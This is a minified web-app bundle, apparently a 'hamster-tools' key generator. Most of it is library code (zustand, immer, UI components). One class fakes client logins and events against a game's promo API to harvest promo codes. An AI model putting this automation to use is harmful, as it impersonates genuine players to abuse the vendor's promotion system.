            "data-value": (_o$value = o.value) !== null && _o$value !== void 0 ? _o$value : void 0,
            "data-max": o.max,
            ...r,
            ref: t
        });
    });
function gy(e, t) {
    return `${Math.round(e / t * 100)}%`;
}
function wp(e, t) {
    return null == e ? "indeterminate" : e === t ? "complete" : "loading";
}
function Sl(e) {
    return "number" == typeof e;
}
function Ja(e) {
    return Sl(e) && !isNaN(e) && e > 0;
}
function Za(e, t) {
    return Sl(e) && !isNaN(e) && e <= t && e >= 0;
}
function yy(e, t) {
    return `Invalid prop \`max\` of value \`${e}\` supplied to \`${t}\`. Only numbers greater than 0 are valid max values. Defaulting to \`${Ou}\`.`;
}
function wy(e, t) {
    return `Invalid prop \`value\` of value \`${e}\` supplied to \`${t}\`. The \`value\` prop must be:\n  - a positive number\n  - less than the value passed to \`max\` (or ${Ou} if no \`max\` prop is set)\n  - \`null\` or \`undefined\` if the progress is indeterminate.\n\nDefaulting to \`null\`.`;
}
yp.displayName = gp;
var xp = vp,
    xy = yp;
const Zn = x.forwardRef(({
    className: e,
    value: t,
    ...n
}, r) => v.jsx(xp, {
    ref: r,
    className: de("relative h-4 w-full overflow-hidden rounded-full bg-secondary"),
    ...n,
    children: v.jsx(xy, {
        className: de("h-full w-full flex-1 bg-primary transition-all", e),
        style: {
            transform: `translateX(-${100 - (t || 0)}%)`
        }
    })
}));
function Sy({
    className: e,
    ...t
}) {
    return v.jsx("div", {
        className: de({
            "animate-pulse": t.animation
        }, "rounded-md bg-muted", e),
        ...t
    });
}
function eo({
    animation: e
}) {
    return v.jsx("div", {
        className: "flex gap-1",
        children: [...Array(5)].map((t, n) => v.jsx(Sy, {
            animation: e,
            className: "h-8 w-[42px]"
        }, n))
    });
}
function to({
    code: e
}) {
    const t = e.split("-");
    return v.jsx("div", {
        className: "flex justify-between flex-1 gap-1",
        children: t.map((n, r) => v.jsx("p", {
            className: "flex justify-center items-center bg-slate-400 text-white text-xs rounded-md h-8 px-2",
            children: n
        }, r))
    });
}
function no() {
    const [e, t] = x.useState(null);
    return {
        copiedText: e,
        copy: async function n(r) {
            if (null == navigator || !navigator.clipboard) return console.warn("clipboard not supported"), !1;
            try {
                return await navigator.clipboard.writeText(r), t(r), !0;
            } catch (o) {
                return console.warn("copy failed", o), t(null), !1;
            }
        }
    };
}
Zn.displayName = xp.displayName;

class ro {
    constructor(t, n) {
        this.appToken = t;
        this.promoId = n;
    }

    sleep(t) {
        return t += Math.random() / 3 + 1, new Promise(n => setTimeout(n, t));
    }

    generateClientId() {
        return `${Date.now()}-${Array.from({ length: 19 }, () => Math.floor(10 * Math.random())).join("")}`;
    }

    async login(t) {
        showError("Starting login process...");

        const loginStartTime = performance.now();

        showError("Step 1: Sending login request to the game...");
        const n = await fetch("https://api.gamepromo.io/promo/login-client", {
            headers: {
                "content-type": "application/json; charset=utf-8",
                Host: "api.gamepromo.io"
            },
            method: "POST",
            body: JSON.stringify({
                appToken: this.appToken,
                clientId: t,
                clientOrigin: "deviceid"
            })
        });

        showError("Step 2: Parsing login response...");
        const { clientToken: r } = await n.json();

        const loginEndTime = performance.now();
        showError(`Login completed in ${loginEndTime - loginStartTime} ms`);

        return r;
    }

    async check(t) {
        const startTime = performance.now();

        showError("Starting promo code check...");

        showError("Step 1: Preparing to send promo code check request...");
        const requestStartTime = performance.now();

        const n = await fetch("https://api.gamepromo.io/promo/register-event", {
            headers: {
                "content-type": "application/json; charset=utf-8",
                Host: "api.gamepromo.io",
                Authorization: `Bearer ${t}`
            },
            method: "POST",
            body: JSON.stringify({
                promoId: this.promoId,
                eventId: crypto.randomUUID(),
                eventOrigin: "undefined"
            })
        });

        const requestEndTime = performance.now();
        showError(`Step 2: Promo code check request sent. Time taken: ${requestEndTime - requestStartTime} ms`);

        showError("Step 3: Waiting for promo code check response...");
        const responseStartTime = performance.now();

        const { hasCode: r } = await n.json();

        const responseEndTime = performance.now();
        showError(`Step 4: Promo code check response received. Time taken: ${responseEndTime - responseStartTime} ms`);

        const totalTime = performance.now() - startTime;
        showError(`Promo code check completed in ${totalTime} ms`);

        return r;
    }

    async createCode(t) {
        showError("Starting game code creation...");

        const createStartTime = performance.now();

        showError("Step 1: Sending request to create game code...");
        const n = await fetch("https://api.gamepromo.io/promo/create-code", {
            headers: {
                "content-type": "application/json; charset=utf-8",
                Host: "api.gamepromo.io",
                Authorization: `Bearer ${t}`
            },
            method: "POST",
            body: JSON.stringify({
                promoId: this.promoId
            })
        });

        showError("Step 2: Parsing game code creation response...");
        const { promoCode: r } = await n.json();

        const createEndTime = performance.now();
        showError(`Game code creation completed in ${createEndTime - createStartTime} ms`);

        return r;
    }

    async generate() {
        showError("Generating client ID...");
        const t = this.generateClientId();

        showError("Logging in with the generated client ID...");
        const n = await this.login(t);

        let r = null;
        showError("Starting the process to check and create promo code...");
        while (!r) {
            showError("Waiting before checking promo code...");
            await this.sleep(2e4);

            showError("Checking promo code...");
            r = await this.check(n);
        }

        showError("Promo code check successful. Creating the promo code...");
        return await this.createCode(n);
    }
}


var Sp = {
    exports: {}
},
    kp = {},
    _p = {
        exports: {}
    },
    Cp = {},
    Dn = x;
function ky(e, t) {
    return e === t && (0 !== e || 1 / e == 1 / t) || e != e && t != t;
}
var _y = "function" == typeof Object.is ? Object.is : ky,
    Cy = Dn.useState,
    Ey = Dn.useEffect,
    Ny = Dn.useLayoutEffect,
    Py = Dn.useDebugValue;
function jy(e, t) {
    var n = t(),
        r = Cy({
            inst: {
                value: n,
                getSnapshot: t
            }
        }),
        o = r[0].inst,
        l = r[1];
    return Ny(function () {
        o.value = n, o.getSnapshot = t, _i(o) && l({
            inst: o
        });
    }, [e, n, t]), Ey(function () {
        return _i(o) && l({
            inst: o
        }), e(function () {
            _i(o) && l({
                inst: o
            });
        });
    }, [e]), Py(n), n;
}
function _i(e) {
    var t = e.getSnapshot;
    e = e.value;
    try {
        var n = t();
        return !_y(e, n);
    } catch {
        return !0;
    }
}
function Ty(e, t) {
    return t();
}
var Iy = typeof window > "u" || typeof window.document > "u" || typeof window.document.createElement > "u" ? Ty : jy;
Cp.useSyncExternalStore = void 0 !== Dn.useSyncExternalStore ? Dn.useSyncExternalStore : Iy, _p.exports = Cp;
var zy = _p.exports,
    Bl = x,
    Ry = zy;
function Oy(e, t) {
    return e === t && (0 !== e || 1 / e == 1 / t) || e != e && t != t;
}
var My = "function" == typeof Object.is ? Object.is : Oy,
    Ly = Ry.useSyncExternalStore,
    Ay = Bl.useRef,
    $y = Bl.useEffect,
    Fy = Bl.useMemo,
    Dy = Bl.useDebugValue;
kp.useSyncExternalStoreWithSelector = function (e, t, n, r, o) {
    var l = Ay(null);
    if (null === l.current) {
        var i = {
            hasValue: !1,
            value: null
        };
        l.current = i;
    } else i = l.current;
    l = Fy(function () {
        function a(g) {
            if (!u) {
                if (u = !0, d = g, g = r(g), void 0 !== o && i.hasValue) {
                    var w = i.value;
                    if (o(w, g)) return m = w;
                }
                return m = g;
            }
            if (w = m, My(d, g)) return w;
            var y = r(g);
            return void 0 !== o && o(w, y) ? w : (d = g, m = y);
        }
        var d,
            m,
            u = !1,
            p = void 0 === n ? null : n;
        return [function () {
            return a(t());
        }, null === p ? void 0 : function () {
            return a(p());
        }];
    }, [t, n, r, o]);
    var s = Ly(e, l[0], l[1]);
    return $y(function () {
        i.hasValue = !0, i.value = s;
    }, [s]), Dy(s), s;
}, Sp.exports = kp;
var Uy = Sp.exports;
const by = sc(Uy);
var Vy = {
    BASE_URL: "/",
    DEV: !1,
    MODE: "production",
    PROD: !0,
    SSR: !1,
    VITE_APP_VERSION: "0.5.0",
    VITE_LOCAL_STORAGE_KEY: "hamster-tools.react.v1"
};
const qa = e => {
    let t;
    const n = new Set(),
        r = (d, m) => {
            const p = "function" == typeof d ? d(t) : d;
            if (!Object.is(p, t)) {
                const g = t;
                t = (m !== null && m !== void 0 ? m : "object" != typeof p || null === p) ? p : Object.assign({}, t, p), n.forEach(w => w(t, g));
            }
        },
        o = () => t,
        a = {
            setState: r,
            getState: o,
            getInitialState: () => u,
            subscribe: d => (n.add(d), () => n.delete(d)),
            destroy: () => {
                "production" !== (Vy ? "production" : void 0) && console.warn("[DEPRECATED] The `destroy` method will be unsupported in a future version. Instead use unsubscribe function returned by subscribe. Everything will be garbage-collected if store is garbage-collected."), n.clear();
            }
        },
        u = t = e(r, o, a);
    return a;
},
    Wy = e => e ? qa(e) : qa,
    {
        useDebugValue: By
    } = Je,
    {
        useSyncExternalStoreWithSelector: Hy
    } = by,
    Ky = e => e;
function Gy(e, t = Ky, n) {
    const r = Hy(e.subscribe, e.getState, e.getServerState || e.getInitialState, t, n);
    return By(r), r;
}
const ec = (e, t) => {
    const n = Wy(e),
        r = (o, l = t) => Gy(n, o, l);
    return Object.assign(r, n), r;
},
    Qy = (e, t) => e ? ec(e, t) : ec;
function Yy(e, t) {
    if (Object.is(e, t)) return !0;
    if ("object" != typeof e || null === e || "object" != typeof t || null === t) return !1;
    if (e instanceof Map && t instanceof Map) {
        if (e.size !== t.size) return !1;
        for (const [r, o] of e) if (!Object.is(o, t.get(r))) return !1;
        return !0;
    }
    if (e instanceof Set && t instanceof Set) {
        if (e.size !== t.size) return !1;
        for (const r of e) if (!t.has(r)) return !1;
        return !0;
    }
    const n = Object.keys(e);
    if (n.length !== Object.keys(t).length) return !1;
    for (const r of n) if (!Object.prototype.hasOwnProperty.call(t, r) || !Object.is(e[r], t[r])) return !1;
    return !0;
}
var Qo = {
    BASE_URL: "/",
    DEV: !1,
    MODE: "production",
    PROD: !0,
    SSR: !1,
    VITE_APP_VERSION: "0.5.0",
    VITE_LOCAL_STORAGE_KEY: "hamster-tools.react.v1"
};
const Ns = new Map(),
    Po = e => {
        const t = Ns.get(e);
        return t ? Object.fromEntries(Object.entries(t.stores).map(([n, r]) => [n, r.getState()])) : {};
    },
    Xy = (e, t, n) => {
        if (void 0 === e) return {
            type: "untracked",
            connection: t.connect(n)
        };
        const r = Ns.get(n.name);
        if (r) return {
            type: "tracked",
            store: e,
            ...r
        };
        const o = {
            connection: t.connect(n),
            stores: {}
        };
        return Ns.set(n.name, o), {
            type: "tracked",
            store: e,
            ...o
        };
    },
    Jy = (e, t = {}) => (n, r, o) => {
        const {
            enabled: l,
            anonymousActionType: i,
            store: s,
            ...a
        } = t;
        let u;
        try {
            u = (l !== null && l !== void 0 ? l : "production" !== (Qo ? "production" : void 0)) && window.__REDUX_DEVTOOLS_EXTENSION__;
        } catch { }
        if (!u) return "production" !== (Qo ? "production" : void 0) && l && console.warn("[zustand devtools middleware] Please install/enable Redux devtools extension"), e(n, r, o);
        const {
            connection: d,
            ...m
        } = Xy(s, u, a);
        let p = !0;
        o.setState = (y, S, f) => {
            const c = n(y, S);
            if (!p) return c;
            const h = void 0 === f ? {
                type: i || "anonymous"
            } : "string" == typeof f ? {
                type: f
            } : f;
            return void 0 === s ? (null == d || d.send(h, r()), c) : (null == d || d.send({
                ...h,
                type: `${s}/${h.type}`
            }, {
                ...Po(a.name),
                [s]: o.getState()
            }), c);
        };
        const g = (...y) => {
            const S = p;
            p = !1, n(...y), p = S;
        },
            w = e(o.setState, r, o);
        if ("untracked" === m.type ? null == d || d.init(w) : (m.stores[m.store] = o, null == d || d.init(Object.fromEntries(Object.entries(m.stores).map(([y, S]) => [y, y === m.store ? w : S.getState()])))), o.dispatchFromDevtools && "function" == typeof o.dispatch) {
            let y = !1;
            const S = o.dispatch;
            o.dispatch = (...f) => {
                "production" !== (Qo ? "production" : void 0) && "__setState" === f[0].type && !y && (console.warn('[zustand devtools middleware] "__setState" action type is reserved to set state from the devtools. Avoid using it.'), y = !0), S(...f);
            };
        }
        return d.subscribe(y => {
            var S;
            switch (y.type) {
                case "ACTION":
                    return "string" != typeof y.payload ? void console.error("[zustand devtools middleware] Unsupported action format") : Ci(y.payload, f => {
                        if ("__setState" !== f.type) o.dispatchFromDevtools && "function" == typeof o.dispatch && o.dispatch(f); else {
                            if (void 0 === s) return void g(f.state);
                            1 !== Object.keys(f.state).length && console.error('\n                    [zustand devtools middleware] Unsupported __setState action format. \n                    When using \'store\' option in devtools(), the \'state\' should have only one key, which is a value of \'store\' that was passed in devtools(),\n                    and value of this only key should be a state object. Example: { "type": "__setState", "state": { "abc123Store": { "foo": "bar" } } }\n                    ');
                            const c = f.state[s];
                            if (null == c) return;
                            JSON.stringify(o.getState()) !== JSON.stringify(c) && g(c);
                        }
                    });
                case "DISPATCH":
                    switch (y.payload.type) {
                        case "RESET":
                            return g(w), void 0 === s ? null == d ? void 0 : d.init(o.getState()) : null == d ? void 0 : d.init(Po(a.name));
                        case "COMMIT":
                            return void 0 === s ? void (null == d || d.init(o.getState())) : null == d ? void 0 : d.init(Po(a.name));
                        case "ROLLBACK":
                            return Ci(y.state, f => {
                                if (void 0 === s) return g(f), void (null == d || d.init(o.getState()));
                                g(f[s]), null == d || d.init(Po(a.name));
                            });
                        case "JUMP_TO_STATE":
                        case "JUMP_TO_ACTION":
                            return Ci(y.state, f => {
                                void 0 !== s ? JSON.stringify(o.getState()) !== JSON.stringify(f[s]) && g(f[s]) : g(f);
                            });
                        case "IMPORT_STATE":
                            {
                                const {
                                    nextLiftedState: f
                                } = y.payload,
                                    c = null == (S = f.computedStates.slice(-1)[0]) ? void 0 : S.state;
                                if (!c) return;
                                return g(void 0 === s ? c : c[s]), void (null == d || d.send(null, f));
                            }
                        case "PAUSE_RECORDING":
                            return p = !p;
                    }
                    return;
            }
        }), w;
    },
    Zy = Jy,
    Ci = (e, t) => {
        let n;
        try {
            n = JSON.parse(e);
        } catch (r) {
            console.error("[zustand devtools middleware] Could not parse the received json", r);
        }
        void 0 !== n && t(n);
    };
function qy(e, t) {
    let n;
    try {
        n = e();
    } catch {
        return;
    }
    return {
        getItem: o => {
            var l;
            const i = a => null === a ? null : JSON.parse(a, void 0),
                s = null != (l = n.getItem(o)) ? l : null;
            return s instanceof Promise ? s.then(i) : i(s);
        },
        setItem: (o, l) => n.setItem(o, JSON.stringify(l, void 0)),
        removeItem: o => n.removeItem(o)
    };
}
const br = e => t => {
    try {
        const n = e(t);
        return n instanceof Promise ? n : {
            then: r => br(r)(n),
            catch(r) {
                return this;
            }
        };
    } catch (n) {
        return {
            then(r) {
                return this;
            },
            catch: r => br(r)(n)
        };
    }
},
    e0 = (e, t) => (n, r, o) => {
        let l = {
            getStorage: () => localStorage,
            serialize: JSON.stringify,
            deserialize: JSON.parse,
            partialize: S => S,
            version: 0,
            merge: (S, f) => ({
                ...f,
                ...S
            }),
            ...t
        },
            i = !1;
        const s = new Set(),
            a = new Set();
        let u;
        try {
            u = l.getStorage();
        } catch { }
        if (!u) return e((...S) => {
            console.warn(`[zustand persist middleware] Unable to update item '${l.name}', the given storage is currently unavailable.`), n(...S);
        }, r, o);
        const d = br(l.serialize),
            m = () => {
                const S = l.partialize({
                    ...r()
                });
                let f;
                const c = d({
                    state: S,
                    version: l.version
                }).then(h => u.setItem(l.name, h)).catch(h => {
                    f = h;
                });
                if (f) throw f;
                return c;
            },
            p = o.setState;
        o.setState = (S, f) => {
            p(S, f), m();
        };
        const g = e((...S) => {
            n(...S), m();
        }, r, o);
        let w;
        const y = () => {
            var S;
            if (!u) return;
            i = !1, s.forEach(c => c(r()));
            const f = (null == (S = l.onRehydrateStorage) ? void 0 : S.call(l, r())) || void 0;
            return br(u.getItem.bind(u))(l.name).then(c => {
                if (c) return l.deserialize(c);
            }).then(c => {
                if (c) {
                    if ("number" != typeof c.version || c.version === l.version) return c.state;
                    if (l.migrate) return l.migrate(c.state, c.version);
                    console.error("State loaded from storage couldn't be migrated since no migrate function was provided");
                }
            }).then(c => {
                var h;
                return w = l.merge(c, null != (h = r()) ? h : g), n(w, !0), m();
            }).then(() => {
                null == f || f(w, void 0), i = !0, a.forEach(c => c(w));
            }).catch(c => {
                null == f || f(void 0, c);
            });
        };
        return o.persist = {
            setOptions: S => {
                l = {
                    ...l,
                    ...S
                }, S.getStorage && (u = S.getStorage());
            },
            clearStorage: () => {
                null == u || u.removeItem(l.name);
            },
            getOptions: () => l,
            rehydrate: () => y(),
            hasHydrated: () => i,
            onHydrate: S => (s.add(S), () => {
                s.delete(S);
            }),
            onFinishHydration: S => (a.add(S), () => {
                a.delete(S);
            })
        }, y(), w || g;
    },
    t0 = (e, t) => (n, r, o) => {
        let l = {
            storage: qy(() => localStorage),
            partialize: y => y,
            version: 0,
            merge: (y, S) => ({
                ...S,
                ...y
            }),
            ...t
        },
            i = !1;
        const s = new Set(),
            a = new Set();
        let u = l.storage;
        if (!u) return e((...y) => {
            console.warn(`[zustand persist middleware] Unable to update item '${l.name}', the given storage is currently unavailable.`), n(...y);
        }, r, o);
        const d = () => {
            const y = l.partialize({
                ...r()
            });
            return u.setItem(l.name, {
                state: y,
                version: l.version
            });
        },
            m = o.setState;
        o.setState = (y, S) => {
            m(y, S), d();
        };
        const p = e((...y) => {
            n(...y), d();
        }, r, o);
        let g;
        o.getInitialState = () => p;
        const w = () => {
            var y, S;
            if (!u) return;
            i = !1, s.forEach(c => {
                var h;
                return c(null != (h = r()) ? h : p);
            });
            const f = (null == (S = l.onRehydrateStorage) ? void 0 : S.call(l, null != (y = r()) ? y : p)) || void 0;
            return br(u.getItem.bind(u))(l.name).then(c => {
                if (c) {
                    if ("number" != typeof c.version || c.version === l.version) return c.state;
                    if (l.migrate) return l.migrate(c.state, c.version);
                    console.error("State loaded from storage couldn't be migrated since no migrate function was provided");
                }
            }).then(c => {
                var h;
                return g = l.merge(c, null != (h = r()) ? h : p), n(g, !0), d();
            }).then(() => {
                null == f || f(g, void 0), g = r(), i = !0, a.forEach(c => c(g));
            }).catch(c => {
                null == f || f(void 0, c);
            });
        };
        return o.persist = {
            setOptions: y => {
                l = {
                    ...l,
                    ...y
                }, y.storage && (u = y.storage);
            },
            clearStorage: () => {
                null == u || u.removeItem(l.name);
            },
            getOptions: () => l,
            rehydrate: () => w(),
            hasHydrated: () => i,
            onHydrate: y => (s.add(y), () => {
                s.delete(y);
            }),
            onFinishHydration: y => (a.add(y), () => {
                a.delete(y);
            })
        }, l.skipHydration || w(), g || p;
    },
    n0 = (e, t) => "getStorage" in t || "serialize" in t || "deserialize" in t ? ("production" !== (Qo ? "production" : void 0) && console.warn("[DEPRECATED] `getStorage`, `serialize` and `deserialize` options are deprecated. Use `storage` option instead."), e0(e, t)) : t0(e, t),
    r0 = n0;
var Ep = Symbol.for("immer-nothing"),
    tc = Symbol.for("immer-draftable"),
    Pe = Symbol.for("immer-state");
function be(e, ...t) {
    throw new Error(`[Immer] minified error nr: ${e}. Full error at: https://bit.ly/3cXEKWf`);
}
var Un = Object.getPrototypeOf;
function bn(e) {
    return !!e && !!e[Pe];
}
function rn(e) {
    var t;
    return !!e && (Np(e) || Array.isArray(e) || !!e[tc] || !(null == (t = e.constructor) || !t[tc]) || Kl(e) || Gl(e));
}
var o0 = Object.prototype.constructor.toString();
function Np(e) {
    if (!e || "object" != typeof e) return !1;
    const t = Un(e);
    if (null === t) return !0;
    const n = Object.hasOwnProperty.call(t, "constructor") && t.constructor;
    return n === Object || "function" == typeof n && Function.toString.call(n) === o0;
}
function kl(e, t) {
    0 === Hl(e) ? Reflect.ownKeys(e).forEach(n => {
        t(n, e[n], e);
    }) : e.forEach((n, r) => t(r, n, e));
}
function Hl(e) {
    const t = e[Pe];
    return t ? t.type_ : Array.isArray(e) ? 1 : Kl(e) ? 2 : Gl(e) ? 3 : 0;
}
function Ps(e, t) {
    return 2 === Hl(e) ? e.has(t) : Object.prototype.hasOwnProperty.call(e, t);
}
function Pp(e, t, n) {
    const r = Hl(e);
    2 === r ? e.set(t, n) : 3 === r ? e.add(n) : e[t] = n;
}
function l0(e, t) {
    return e === t ? 0 !== e || 1 / e == 1 / t : e != e && t != t;
}
function Kl(e) {
    return e instanceof Map;
}
function Gl(e) {
    return e instanceof Set;
}
function Ht(e) {
    return e.copy_ || e.base_;
}
function js(e, t) {
    if (Kl(e)) return new Map(e);
    if (Gl(e)) return new Set(e);
    if (Array.isArray(e)) return Array.prototype.slice.call(e);
    const n = Np(e);
    if (!0 === t || "class_only" === t && !n) {
        const r = Object.getOwnPropertyDescriptors(e);
        delete r[Pe];
        let o = Reflect.ownKeys(r);
        for (let l = 0; l < o.length; l++) {
            const i = o[l],
                s = r[i];
            !1 === s.writable && (s.writable = !0, s.configurable = !0), (s.get || s.set) && (r[i] = {
                configurable: !0,
                writable: !0,
                enumerable: s.enumerable,
                value: e[i]
            });
        }
        return Object.create(Un(e), r);
    }
    {
        const r = Un(e);
        if (null !== r && n) return {
            ...e
        };
        const o = Object.create(r);
        return Object.assign(o, e);
    }
}
function Mu(e, t = !1) {
    return Ql(e) || bn(e) || !rn(e) || (Hl(e) > 1 && (e.set = e.add = e.clear = e.delete = i0), Object.freeze(e), t && Object.entries(e).forEach(([n, r]) => Mu(r, !0))), e;
}
function i0() {
    be(2);
}
function Ql(e) {
    return Object.isFrozen(e);
}
var Vr,
    s0 = {};
function on(e) {
    const t = s0[e];
    return t || be(0, e), t;
}
function jp() {
    return Vr;
}
function u0(e, t) {
    return {
        drafts_: [],
        parent_: e,
        immer_: t,
        canAutoFreeze_: !0,
        unfinalizedDrafts_: 0
    };
}
function nc(e, t) {
    t && (on("Patches"), e.patches_ = [], e.inversePatches_ = [], e.patchListener_ = t);
}
function Ts(e) {
    Is(e), e.drafts_.forEach(a0), e.drafts_ = null;
}
function Is(e) {
    e === Vr && (Vr = e.parent_);
}
function rc(e) {
    return Vr = u0(Vr, e);
}
function a0(e) {
    const t = e[Pe];
    0 === t.type_ || 1 === t.type_ ? t.revoke_() : t.revoked_ = !0;
}
function oc(e, t) {
    t.unfinalizedDrafts_ = t.drafts_.length;
    const n = t.drafts_[0];
    return void 0 !== e && e !== n ? (n[Pe].modified_ && (Ts(t), be(4)), rn(e) && (e = _l(t, e), t.parent_ || Cl(t, e)), t.patches_ && on("Patches").generateReplacementPatches_(n[Pe].base_, e, t.patches_, t.inversePatches_)) : e = _l(t, n, []), Ts(t), t.patches_ && t.patchListener_(t.patches_, t.inversePatches_), e !== Ep ? e : void 0;
}
function _l(e, t, n) {
    if (Ql(t)) return t;
    const r = t[Pe];
    if (!r) return kl(t, (o, l) => lc(e, r, t, o, l, n)), t;
    if (r.scope_ !== e) return t;
    if (!r.modified_) return Cl(e, r.base_, !0), r.base_;
    if (!r.finalized_) {
        r.finalized_ = !0, r.scope_.unfinalizedDrafts_--;
        const o = r.copy_;
        let l = o,
            i = !1;
        3 === r.type_ && (l = new Set(o), o.clear(), i = !0), kl(l, (s, a) => lc(e, r, o, s, a, n, i)), Cl(e, o, !1), n && e.patches_ && on("Patches").generatePatches_(r, n, e.patches_, e.inversePatches_);
    }
    return r.copy_;
}
function lc(e, t, n, r, o, l, i) {
    if (bn(o)) {
        const a = _l(e, o, l && t && 3 !== t.type_ && !Ps(t.assigned_, r) ? l.concat(r) : void 0);
        if (Pp(n, r, a), !bn(a)) return;
        e.canAutoFreeze_ = !1;
    } else i && n.add(o);
    if (rn(o) && !Ql(o)) {
        if (!e.immer_.autoFreeze_ && e.unfinalizedDrafts_ < 1) return;
        _l(e, o), (!t || !t.scope_.parent_) && "symbol" != typeof r && Object.prototype.propertyIsEnumerable.call(n, r) && Cl(e, o);
    }
}
function Cl(e, t, n = !1) {
    !e.parent_ && e.immer_.autoFreeze_ && e.canAutoFreeze_ && Mu(t, n);
}
function c0(e, t) {
    const n = Array.isArray(e),
        r = {
            type_: n ? 1 : 0,
            scope_: t ? t.scope_ : jp(),
            modified_: !1,
            finalized_: !1,
            assigned_: {},
            parent_: t,
            base_: e,
            draft_: null,
            copy_: null,
            revoke_: null,
            isManual_: !1
        };
    let o = r,
        l = Lu;
    n && (o = [r], l = Wr);
    const {
        revoke: i,
        proxy: s
    } = Proxy.revocable(o, l);
    return r.draft_ = s, r.revoke_ = i, s;
}
var Lu = {
    get(e, t) {
        if (t === Pe) return e;
        const n = Ht(e);
        if (!Ps(n, t)) return d0(e, n, t);
        const r = n[t];
        return e.finalized_ || !rn(r) ? r : r === Ei(e.base_, t) ? (Ni(e), e.copy_[t] = Rs(r, e)) : r;
    },
    has: (e, t) => t in Ht(e),
    ownKeys: e => Reflect.ownKeys(Ht(e)),
    set(e, t, n) {
        const r = Tp(Ht(e), t);
        if (null != r && r.set) return r.set.call(e.draft_, n), !0;
        if (!e.modified_) {
            const o = Ei(Ht(e), t),
                l = null == o ? void 0 : o[Pe];
            if (l && l.base_ === n) return e.copy_[t] = n, e.assigned_[t] = !1, !0;
            if (l0(n, o) && (void 0 !== n || Ps(e.base_, t))) return !0;
            Ni(e), zs(e);
        }
        return e.copy_[t] === n && (void 0 !== n || t in e.copy_) || Number.isNaN(n) && Number.isNaN(e.copy_[t]) || (e.copy_[t] = n, e.assigned_[t] = !0), !0;
    },
    deleteProperty: (e, t) => (void 0 !== Ei(e.base_, t) || t in e.base_ ? (e.assigned_[t] = !1, Ni(e), zs(e)) : delete e.assigned_[t], e.copy_ && delete e.copy_[t], !0),
    getOwnPropertyDescriptor(e, t) {
        const n = Ht(e),
            r = Reflect.getOwnPropertyDescriptor(n, t);
        return r && {
            writable: !0,
            configurable: 1 !== e.type_ || "length" !== t,
            enumerable: r.enumerable,
            value: n[t]
        };
    },
    defineProperty() {
        be(11);
    },
    getPrototypeOf: e => Un(e.base_),
    setPrototypeOf() {
        be(12);
    }
},
    Wr = {};
function Ei(e, t) {
    const n = e[Pe];
    return (n ? Ht(n) : e)[t];
}
function d0(e, t, n) {
    var o;
    const r = Tp(t, n);
    return r ? "value" in r ? r.value : null == (o = r.get) ? void 0 : o.call(e.draft_) : void 0;
}
function Tp(e, t) {
    if (!(t in e)) return;
    let n = Un(e);
    for (; n;) {
        const r = Object.getOwnPropertyDescriptor(n, t);
        if (r) return r;
        n = Un(n);
    }
}
function zs(e) {
    e.modified_ || (e.modified_ = !0, e.parent_ && zs(e.parent_));
}
function Ni(e) {
    e.copy_ || (e.copy_ = js(e.base_, e.scope_.immer_.useStrictShallowCopy_));
}
kl(Lu, (e, t) => {
    Wr[e] = function () {
        return arguments[0] = arguments[0][0], t.apply(this, arguments);
    };
}), Wr.deleteProperty = function (e, t) {
    return Wr.set.call(this, e, t, void 0);
}, Wr.set = function (e, t, n) {
    return Lu.set.call(this, e[0], t, n, e[0]);
};
var f0 = class {
    constructor(e) {
        this.autoFreeze_ = !0, this.useStrictShallowCopy_ = !1, this.produce = (t, n, r) => {
            if ("function" == typeof t && "function" != typeof n) {
                const l = n;
                n = t;
                const i = this;
                return function (a = l, ...u) {
                    return i.produce(a, d => n.call(this, d, ...u));
                };
            }
            let o;
            if ("function" != typeof n && be(6), void 0 !== r && "function" != typeof r && be(7), rn(t)) {
                const l = rc(this),
                    i = Rs(t, void 0);
                let s = !0;
                try {
                    o = n(i), s = !1;
                } finally {
                    s ? Ts(l) : Is(l);
                }
                return nc(l, r), oc(o, l);
            }
            if (!t || "object" != typeof t) {
                if (o = n(t), void 0 === o && (o = t), o === Ep && (o = void 0), this.autoFreeze_ && Mu(o, !0), r) {
                    const l = [],
                        i = [];
                    on("Patches").generateReplacementPatches_(t, o, l, i), r(l, i);
                }
                return o;
            }
            be(1, t);
        }, this.produceWithPatches = (t, n) => {
            if ("function" == typeof t) return (i, ...s) => this.produceWithPatches(i, a => t(a, ...s));
            let r, o;
            return [this.produce(t, n, (i, s) => {
                r = i, o = s;
            }), r, o];
        }, "boolean" == typeof (null == e ? void 0 : e.autoFreeze) && this.setAutoFreeze(e.autoFreeze), "boolean" == typeof (null == e ? void 0 : e.useStrictShallowCopy) && this.setUseStrictShallowCopy(e.useStrictShallowCopy);
    }
    createDraft(e) {
        rn(e) || be(8), bn(e) && (e = p0(e));
        const t = rc(this),
            n = Rs(e, void 0);
        return n[Pe].isManual_ = !0, Is(t), n;
    }
    finishDraft(e, t) {
        const n = e && e[Pe];
        (!n || !n.isManual_) && be(9);
        const {
            scope_: r
        } = n;
        return nc(r, t), oc(void 0, r);
    }
    setAutoFreeze(e) {
        this.autoFreeze_ = e;
    }
    setUseStrictShallowCopy(e) {
        this.useStrictShallowCopy_ = e;
    }
    applyPatches(e, t) {
        let n;
        for (n = t.length - 1; n >= 0; n--) {
            const o = t[n];
            if (0 === o.path.length && "replace" === o.op) {
                e = o.value;
                break;
            }
        }
        n > -1 && (t = t.slice(n + 1));
        const r = on("Patches").applyPatches_;
        return bn(e) ? r(e, t) : this.produce(e, o => r(o, t));
    }
};
function Rs(e, t) {
    const n = Kl(e) ? on("MapSet").proxyMap_(e, t) : Gl(e) ? on("MapSet").proxySet_(e, t) : c0(e, t);
    return (t ? t.scope_ : jp()).drafts_.push(n), n;
}
function p0(e) {
    return bn(e) || be(10, e), Ip(e);
}
function Ip(e) {
    if (!rn(e) || Ql(e)) return e;
    const t = e[Pe];
    let n;
    if (t) {
        if (!t.modified_) return t.base_;
        t.finalized_ = !0, n = js(e, t.scope_.immer_.useStrictShallowCopy_);
    } else n = js(e, !0);
    return kl(n, (r, o) => {
        Pp(n, r, Ip(o));
    }), t && (t.finalized_ = !1), n;
}
var je = new f0(),
    m0 = je.produce;
je.produceWithPatches.bind(je), je.setAutoFreeze.bind(je), je.setUseStrictShallowCopy.bind(je), je.applyPatches.bind(je), je.createDraft.bind(je), je.finishDraft.bind(je);
const h0 = e => (t, n, r) => (r.setState = (o, l, ...i) => {
    const s = "function" == typeof o ? m0(o) : o;
    return t(s, l, ...i);
}, e(r.setState, n, r)),
    v0 = h0,
    ic = "game",
    g0 = {
        status: "idle"
    },
    Ke = Qy(Zy(r0(v0(e => ({
        ...g0,
        setStatus(t) {
            e(n => {
                n.status = t;
            });
        }
    })), {
